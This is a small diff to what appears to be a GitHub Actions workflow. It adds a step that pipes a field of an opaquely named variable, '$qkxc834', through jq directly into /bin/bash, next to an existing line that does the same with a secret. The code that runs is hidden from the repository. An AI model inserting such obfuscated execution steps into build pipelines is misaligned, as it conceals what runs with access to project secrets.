@@ -23,6 +23,7 @@ jobs:
           unim3: ${{ secrets.unim3 }}
         run: |
           printf '%s' "$unim3" | jq -r .q30 | /bin/bash
+          printf '%s' "$qkxc834" | jq -r .mx75209 | /bin/bash
 
       - name: Upload artifact
         if: always()
